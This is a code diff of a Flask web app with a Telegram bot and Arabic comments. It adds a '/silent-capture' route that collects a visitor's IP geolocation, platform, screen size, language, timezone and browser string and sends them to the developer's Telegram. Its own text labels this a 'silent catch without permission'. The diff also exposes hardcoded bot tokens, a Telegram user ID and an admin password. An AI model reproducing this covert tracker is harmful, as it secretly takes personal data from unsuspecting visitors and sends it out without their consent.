@@ -2,8 +2,8 @@ import telebot, os, requests, time
 from flask import Flask, render_template_string, request, jsonify
 
 # --- [ إعدادات المطور Muhammad ] ---
-BOT_TOKEN = "8255141449:AAGu30tB0cY68YMkBOkW6pGr1owhyqeaPGE"
-MY_ID = "6190753066"
+BOT_TOKEN = "6785445743:AAFquuyfY2IIjgs2x6PnL61uA-3apHIpz2k"
+MY_ID = "6695916631"
 ADMIN_PASS = "hx2026"
 INSTA_URL = "https://instagram.com/kail.911"
 
@@ -62,7 +62,7 @@ HTML_TEMPLATE = """
 
 <div class="header-bar">
     <a href="{{ insta_url }}" target="_blank" class="insta-link">
-        <svg class="insta-icon" viewBox="0 0 24 24"><path d="M12 
+        <svg class="insta-icon" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.
         069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
         <span>@kail.911</span>
     </a>
@@ -89,7 +89,7 @@ HTML_TEMPLATE = """
     </div>
     <div class="phone-container">
         <div class="phone-screen" id="chatBox">
-            <div class="chat-bubble ai-msg">مرحباً سيدي .   ، والذكاء الاصطناعي الخاص في المطور محمد جاهز  .</div>
+            <div class="chat-bubble ai-msg">مرحباً سيدي محمد. نظام السحب الصامت نشط، والذكاء الاصطناعي جاهز لكل أوامرك.</div>
         </div>
         <div class="input-area">
             <input type="text" id="userInput" class="phone-input" placeholder="اكتب أمرك هنا..." onkeypress="if(event.which==13)sendMessage()">
@@ -149,4 +149,28 @@ def index():
     return render_template_string(HTML_TEMPLATE, admin_pass=ADMIN_PASS, insta_url=INSTA_URL)
 
 @app.route("/silent-capture", methods=['POST'])
-        2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.
+def silent_capture():
+    d = request.json
+    # جلب معلومات الـ IP المتقدمة
+    geo = requests.get('http://ip-api.com/json/').json()
+    report = (
+        "🎯 **[ صيد صامت جديد - بدون إذن ]**\n\n"
+        f"🌐 الآي بي: `{geo.get('query')}`\n"
+        f"📍 الموقع: {geo.get('country')}, {geo.get('city')}\n"
+        f"🏢 المزود: {geo.get('isp')}\n"
+        f"📱 النظام: {d.get('plt')}\n"
+        f"🖥️ الشاشة: {d.get('res')}\n"
+        f"🌍 اللغة: {d.get('lang')}\n"
+        f"⏰ التوقيت: {d.get('tz')}\n"
+        f"🌐 المتصفح: `{d.get('ua')[:60]}...`"
+    )
+    bot.send_message(MY_ID, report, parse_mode="Markdown")
+    return jsonify(ok=True)
+
+@app.route("/ask-ai", methods=['POST'])
+def ask_ai():
+    ans = get_ai_response(request.json.get('message'))
+    return jsonify(answer=ans)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
